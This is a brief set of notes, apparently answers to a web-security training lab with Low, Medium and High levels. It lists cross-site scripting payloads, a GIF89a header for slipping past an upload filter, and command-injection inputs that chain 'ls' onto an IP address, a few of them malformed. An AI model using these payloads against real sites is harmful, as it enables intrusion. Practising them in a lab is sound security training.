2nd -
Low : <script>alert("Hello")</script>
Medium : <img src=x onerror=alert('XSS');>
High:<svg onload=alert(1)>

4th
GIF89a;

5th
Low 127.0.0.0.1 && ls 
Medium 127.0.0.0.1 & ls
High 127.0.0.1 |ls
